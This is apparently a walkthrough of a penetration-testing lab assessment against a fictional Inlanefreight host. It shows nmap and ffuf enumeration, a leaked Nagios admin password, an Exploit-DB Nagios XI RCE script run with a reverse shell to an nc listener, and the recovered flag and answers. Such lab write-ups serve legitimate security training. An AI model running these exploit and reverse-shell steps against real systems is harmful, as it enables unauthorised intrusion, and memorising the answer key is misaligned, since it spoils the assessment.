# Attacking Common Applications - Skills Assessment II

During an external penetration test for the company Inlanefreight, you come across a host that, at first glance, does not seem extremely interesting. At this point in the assessment, you have exhausted all options and hit several dead ends. Looking back through your enumeration notes, something catches your eye about this particular host. You also see a note that you don't recall about the `gitlab.inlanefreight.local` vhost.

Performing deeper and iterative enumeration reveals several serious flaws. Enumerate the target carefully and answer all the questions below to complete the second part of the skills assessment.

**Questions**

nmap scans

<pre class="language-bash"><code class="lang-bash">sudo nmap -sS -n -Pn -p- --min-rate 5000 gitlab.inlanefreight.local -sV -sC
<strong>PORT     STATE SERVICE    VERSION
</strong>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: skills2, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://gitlab.inlanefreight.local:8180/
|_http-server-header: Apache/2.4.41 (Ubuntu)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.41
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Shipter\xE2\x80\x93Transport and Logistics HTML5 Template 
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=10.129.201.90/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2021-09-02T01:49:48
|_Not valid after:  2031-08-31T01:49:48
5667/tcp open  tcpwrapped
8060/tcp open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 404 Not Found
8180/tcp open  http       nginx
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
|_/*/new /*/edit /*/raw
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://gitlab.inlanefreight.local:8180/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
9094/tcp open  unknown
Service Info: Hosts:  skills2, 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>

first we do ffuf vhost enumeration

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://inlanefreight.local -H 'Host: FUZZ.inlanefreight.local' -fs 46166
#blog                    [Status: 200, Size: 50116, Words: 16140, Lines: 1015, Duration: 2185ms]
#monitoring              [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 433ms]
#gitlab                  [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 244ms]
```

What is the URL of the WordPress instance?

```
http://blog.inlanefreight.local
```

What is the name of the public GitLab project?

```
virtualhost
```

What is the FQDN of the third vhost?

```
monitoring.inlanefreight.local
```

What application is running on this third vhost? (One word)

```
nagios
```

What is the admin password to access this application?

<pre class="language-bash"><code class="lang-bash"><strong>#just create gitlab account and look inside :)
</strong><strong>postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&#x26;^lC';
</strong></code></pre>

Obtain reverse shell access on the target and submit the contents of the flag.txt file.

```bash
searchsploit nagios XI   
#Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated | php/webapps/49422.py
cp /usr/share/exploitdb/exploits/php/webapps/49422.py .
python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.14.59 4444
nc -nvlp 4444
#we got shells
find / -name *flag*.txt 2>/dev/null
/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
afe377683dce373ec2bf7eaf1e0107eb
```
